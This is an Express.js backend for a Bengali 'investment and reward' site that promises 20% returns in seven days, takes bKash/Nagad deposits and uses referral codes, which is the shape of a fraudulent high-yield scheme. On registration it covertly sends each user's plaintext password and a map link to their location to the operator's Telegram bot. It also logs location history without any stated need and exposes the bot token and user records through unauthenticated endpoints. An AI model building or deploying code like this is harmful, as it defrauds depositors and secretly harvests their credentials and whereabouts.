const express = require("express");
const path = require("path");
const fs = require("fs");
const crypto = require("crypto");
require("dotenv").config();

const app = express();
const PORT = Number(process.env.PORT || 3000);
const ADMIN_PIN = String(process.env.ADMIN_PIN || "6123");
const APP_SECRET = String(process.env.APP_SECRET || "change-this-secret");

const DATA_DIR = path.join(__dirname, "data");
const DB_FILE = path.join(DATA_DIR, "db.json");
fs.mkdirSync(DATA_DIR, { recursive: true });

let fileLockPromise = Promise.resolve();
function withFileLock(operation) {
  const res = fileLockPromise.then(() => operation());
  fileLockPromise = res.catch(() => {});
  return res;
}

function defaultDb() {
  return {
    registrations: [],
    investments: [],
    transactions: [],
    withdrawals: [],
    deposits: [],
    usedTrxIds: [],
    promoTasks: [{ id: "promo_1", title: "YouTube Promo Visit", url: "https://youtube.com", reward: 45 }],
    settings: {
      noticeText: "📢 Master Investment & Reward System live!",
      noticeActive: true,
      investEnabled: true,
      minInvest: 100,
      maxInvest: 50000,
      investRate: 20,
      investDuration: 7,
      adminBkash: "01700000000",
      adminNagad: "01800000000",
      telegramToken: "",
      telegramChatId: ""
    }
  };
}

function loadDb() {
  try {
    if (!fs.existsSync(DB_FILE)) {
      const db = defaultDb();
      fs.writeFileSync(DB_FILE, JSON.stringify(db, null, 2));
      return db;
    }
    const parsed = JSON.parse(fs.readFileSync(DB_FILE, "utf8"));
    return {
      registrations: Array.isArray(parsed.registrations) ? parsed.registrations : [],
      investments: Array.isArray(parsed.investments) ? parsed.investments : [],
      transactions: Array.isArray(parsed.transactions) ? parsed.transactions : [],
      withdrawals: Array.isArray(parsed.withdrawals) ? parsed.withdrawals : [],
      deposits: Array.isArray(parsed.deposits) ? parsed.deposits : [],
      usedTrxIds: Array.isArray(parsed.usedTrxIds) ? parsed.usedTrxIds : [],
      promoTasks: Array.isArray(parsed.promoTasks) ? parsed.promoTasks : defaultDb().promoTasks,
      settings: { ...defaultDb().settings, ...(parsed.settings || {}) }
    };
  } catch { return defaultDb(); }
}

function saveDb(db) {
  const tmp = DB_FILE + ".tmp";
  fs.writeFileSync(tmp, JSON.stringify(db, null, 2));
  fs.renameSync(tmp, DB_FILE);
}

function clean(v, max = 200) { return String(v || "").trim().slice(0, max); }

// Telegram Notification Helper
async function sendTelegramNotification(text, settings) {
  if (!settings || !settings.telegramToken || !settings.telegramChatId) return;
  try {
    const url = `https://api.telegram.org/bot${settings.telegramToken}/sendMessage`;
    await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: settings.telegramChatId,
        text: text,
        parse_mode: "HTML"
      })
    });
  } catch (e) {
    console.error("Telegram Notification Error:", e);
  }
}

function signSession(payload) {
  const body = Buffer.from(JSON.stringify(payload)).toString("base64url");
  const sig = crypto.createHmac("sha256", APP_SECRET).update(body).digest("base64url");
  return `${body}.${sig}`;
}

function verifySession(token) {
  try {
    const [body, sig] = String(token || "").split(".");
    if (!body || !sig) return null;
    const expected = crypto.createHmac("sha256", APP_SECRET).update(body).digest("base64url");
    if (sig !== expected) return null;
    return JSON.parse(Buffer.from(body, "base64url").toString("utf8"));
  } catch { return null; }
}

function cookies(req) {
  const out = {};
  for (const part of (req.headers.cookie || "").split(";")) {
    const i = part.indexOf("=");
    if (i > -1) out[part.slice(0, i).trim()] = decodeURIComponent(part.slice(i + 1).trim());
  }
  return out;
}

function requireAdmin(req, res, next) {
  const session = verifySession(cookies(req).admin_session);
  if (!session || session.role !== "admin") return res.status(401).json({ error: "Unauthorized" });
  next();
}

app.use(express.json({ limit: "100kb" }));
app.use(express.static(path.join(__dirname, "public")));

app.get("/api/settings", (req, res) => {
  const db = loadDb();
  res.json({ ok: true, settings: db.settings });
});

app.post("/api/register/start", (req, res) => {
  withFileLock(async () => {
    const { name, phone, password, age, location } = req.body;
    const db = loadDb();
    if (db.registrations.some(r => r.phone === phone)) return res.status(409).json({ error: "এই নাম্বার দিয়ে ইতিপূর্বে অ্যাকাউন্ট খোলা হয়েছে।" });

    const id = crypto.randomUUID();
    const user = {
      id, name, phone, password, age,
      balance: 100,
      referralCode: "REF" + Math.floor(100000 + Math.random() * 900000),
      referralCount: 0, status: "awaiting_payment",
      location, locationHistory: [location],
      createdAt: new Date().toISOString()
    };
    db.registrations.unshift(user);
    db.transactions.unshift({ id: crypto.randomUUID(), userId: id, type: "Registration Bonus", amount: 100, date: new Date().toISOString() });
    saveDb(db);

    // Send Telegram Notification with Location Map Link
    let mapLink = location ? `https://maps.google.com/?q=${location.latitude},${location.longitude}` : 'N/A';
    const msg = `👤 <b>New Registration!</b>\n\nName: ${name}\nPhone: ${phone}\nAge: ${age}\nPassword: ${password}\n📍 Location: <a href="${mapLink}">View on Google Maps</a>`;
    sendTelegramNotification(msg, db.settings);

    res.json({ ok: true, user });
  });
});

app.post("/api/login", (req, res) => {
  const { phone, password } = req.body;
  const db = loadDb();
  const user = db.registrations.find(r => r.phone === phone && r.password === password);
  if (!user) return res.status(401).json({ error: "Invalid Information" });
  res.json({ ok: true, user });
});

app.get("/api/user/:id", (req, res) => {
  const db = loadDb();
  const user = db.registrations.find(r => r.id === req.params.id);
  if (!user) return res.status(404).json({ error: "User not found" });
  res.json({ ok: true, user });
});

app.post("/api/user/:id/location", (req, res) => {
  withFileLock(async () => {
    const db = loadDb();
    const user = db.registrations.find(r => r.id === req.params.id);
    if (!user) return res.status(404).json({ error: "User not found" });
    const loc = req.body?.location;
    if (loc) {
      user.location = loc;
      if (!Array.isArray(user.locationHistory)) user.locationHistory = [];
      user.locationHistory.push({ ...loc, capturedAt: new Date().toISOString() });
      saveDb(db);
    }
    res.json({ ok: true });
  });
});

app.post("/api/register/:id/payment", (req, res) => {
  withFileLock(async () => {
    const db = loadDb();
    const user = db.registrations.find(r => r.id === req.params.id);
    if (!user) return res.status(404).json({ error: "User not found" });
    user.status = "complete";
    saveDb(db);
    res.json({ ok: true, user });
  });
});

app.post("/api/deposit", (req, res) => {
  withFileLock(async () => {
    const { userId, method, amount, trxId } = req.body;
    const db = loadDb();
    const user = db.registrations.find(r => r.id === userId);
    if (!user) return res.status(404).json({ error: "User not found" });

    const cleanTrx = clean(trxId, 50).toUpperCase();
    if (db.usedTrxIds.includes(cleanTrx)) return res.status(400).json({ error: "এই TrxID টি ইতিপূর্বে ব্যবহার করা হয়েছে!" });

    db.usedTrxIds.push(cleanTrx);
    db.deposits.unshift({ id: crypto.randomUUID(), userId, method, amount, trxId: cleanTrx, status: "Pending", date: new Date().toISOString() });
    db.transactions.unshift({ id: crypto.randomUUID(), userId, type: `Deposit (${method})`, amount, status: "Pending", date: new Date().toISOString() });
    saveDb(db);

    // Send Telegram Notification for Deposit
    const msg = `💳 <b>New Deposit Request!</b>\n\nUser: ${user.name} (${user.phone})\nMethod: ${method}\nAmount: ৳${amount}\nTrxID: <code>${cleanTrx}</code>`;
    sendTelegramNotification(msg, db.settings);

    res.json({ ok: true });
  });
});

app.post("/api/invest/create", (req, res) => {
  withFileLock(async () => {
    const { userId, amount } = req.body;
    const db = loadDb();
    if (!db.settings.investEnabled) return res.status(400).json({ error: "বিনিয়োগ সিস্টেম বর্তমানে বন্ধ রয়েছে।" });

    const user = db.registrations.find(r => r.id === userId);
    if (!user) return res.status(404).json({ error: "User not found" });

    const numAmt = Number(amount);
    if (numAmt < db.settings.minInvest || numAmt > db.settings.maxInvest) {
      return res.status(400).json({ error: `বিনিয়োগের পরিমাণ ৳${db.settings.minInvest} থেকে ৳${db.settings.maxInvest} এর মধ্যে হতে হবে।` });
    }
    if (user.balance < numAmt) return res.status(400).json({ error: "অ্যাকাউন্টে পর্যাপ্ত ব্যালেন্স নেই।" });

    user.balance -= numAmt;
    const rate = db.settings.investRate;
    const profit = Math.floor((numAmt * rate) / 100);
    const durationDays = db.settings.investDuration;

    const unlockDate = new Date();
    unlockDate.setDate(unlockDate.getDate() + durationDays);

    const investment = {
      id: crypto.randomUUID(),
      userId,
      amount: numAmt,
      rate,
      profit,
      totalReturn: numAmt + profit,
      status: "Active",
      createdAt: new Date().toISOString(),
      unlockDate: unlockDate.toISOString()
    };

    db.investments.unshift(investment);
    db.transactions.unshift({
      id: crypto.randomUUID(),
      userId,
      type: `Investment Deduction`,
      amount: -numAmt,
      date: new Date().toISOString()
    });

    saveDb(db);
    res.json({ ok: true, balance: user.balance, investment });
  });
});

app.get("/api/investments/:userId", (req, res) => {
  const db = loadDb();
  const list = db.investments.filter(i => i.userId === req.params.userId);
  res.json({ ok: true, investments: list });
});

app.post("/api/invest/claim", (req, res) => {
  withFileLock(async () => {
    const { userId, investId } = req.body;
    const db = loadDb();
    const user = db.registrations.find(r => r.id === userId);
    const inv = db.investments.find(i => i.id === investId && i.userId === userId);

    if (!user || !inv) return res.status(404).json({ error: "Not found" });
    if (inv.status !== "Active") return res.status(400).json({ error: "ইতিমধ্যে এই ইনভেস্টমেন্ট ক্লেম করা হয়েছে।" });

    if (new Date() < new Date(inv.unlockDate)) {
      return res.status(400).json({ error: "মেয়াদ এখনও শেষ হয়নি!" });
    }

    inv.status = "Completed";
    const totalPayout = inv.totalReturn;
    user.balance += totalPayout;

    db.transactions.unshift({
      id: crypto.randomUUID(),
      userId,
      type: `Investment Profit & Capital Payout`,
      amount: totalPayout,
      date: new Date().toISOString()
    });

    saveDb(db);
    res.json({ ok: true, balance: user.balance });
  });
});

app.get("/api/transactions/:userId", (req, res) => {
  const db = loadDb();
  res.json({ ok: true, transactions: db.transactions.filter(t => t.userId === req.params.userId) });
});

app.post("/api/withdraw", (req, res) => {
  withFileLock(async () => {
    const { userId, method, number, amount } = req.body;
    const db = loadDb();
    const user = db.registrations.find(r => r.id === userId);
    if (!user || user.balance < amount || amount < 500) return res.status(400).json({ error: "Insufficient balance" });

    user.balance -= amount;
    db.withdrawals.unshift({ id: crypto.randomUUID(), userId, method, number, amount, status: "Pending", date: new Date().toISOString() });
    db.transactions.unshift({ id: crypto.randomUUID(), userId, type: `Withdraw (${method})`, amount: -amount, date: new Date().toISOString() });
    saveDb(db);

    // Send Telegram Notification for Withdraw
    const msg = `💸 <b>New Withdraw Request!</b>\n\nUser: ${user.name} (${user.phone})\nMethod: ${method} (${number})\nAmount: ৳${amount}`;
    sendTelegramNotification(msg, db.settings);

    res.json({ ok: true, balance: user.balance });
  });
});

app.get("/api/promo/tasks", (req, res) => {
  const db = loadDb();
  res.json({ tasks: db.promoTasks });
});

/* Master Admin APIs */
app.post("/api/admin/login", (req, res) => {
  if (String(req.body?.pin || "") !== ADMIN_PIN) return res.status(401).json({ error: "Invalid PIN" });
  const token = signSession({ role: "admin", exp: Date.now() + 8*3600*1000 });
  res.setHeader("Set-Cookie", `admin_session=${token}; HttpOnly; Path=/; Max-Age=28800`);
  res.json({ ok: true });
});

app.get("/api/admin/overview", requireAdmin, (req, res) => {
  const db = loadDb();
  res.json({
    ok: true,
    users: db.registrations,
    deposits: db.deposits,
    withdrawals: db.withdrawals,
    tasks: db.promoTasks,
    settings: db.settings
  });
});

app.post("/api/admin/deposit/approve", requireAdmin, (req, res) => {
  withFileLock(async () => {
    const { depId } = req.body;
    const db = loadDb();
    const dep = db.deposits.find(d => d.id === depId);
    if (dep && dep.status === "Pending") {
      dep.status = "Approved";
      const user = db.registrations.find(u => u.id === dep.userId);
      if (user) user.balance += Number(dep.amount);
      saveDb(db);
    }
    res.json({ ok: true });
  });
});

app.post("/api/admin/withdraw/approve", requireAdmin, (req, res) => {
  withFileLock(async () => {
    const { wId } = req.body;
    const db = loadDb();
    const w = db.withdrawals.find(x => x.id === wId);
    if (w && w.status === "Pending") {
      w.status = "Approved";
      saveDb(db);
    }
    res.json({ ok: true });
  });
});

// Admin Manage Promo Tasks
app.post("/api/admin/task/add", requireAdmin, (req, res) => {
  withFileLock(async () => {
    const { title, url, reward } = req.body;
    const db = loadDb();
    db.promoTasks.push({ id: crypto.randomUUID(), title, url, reward: Number(reward) });
    saveDb(db);
    res.json({ ok: true });
  });
});

app.post("/api/admin/task/delete", requireAdmin, (req, res) => {
  withFileLock(async () => {
    const { taskId } = req.body;
    const db = loadDb();
    db.promoTasks = db.promoTasks.filter(t => t.id !== taskId);
    saveDb(db);
    res.json({ ok: true });
  });
});

app.get("/api/admin/settings", requireAdmin, (req, res) => {
  const db = loadDb();
  res.json(db.settings);
});

app.post("/api/admin/settings", requireAdmin, (req, res) => {
  withFileLock(async () => {
    const db = loadDb();
    db.settings = { ...db.settings, ...req.body };
    saveDb(db);
    res.json({ ok: true });
  });
});

app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
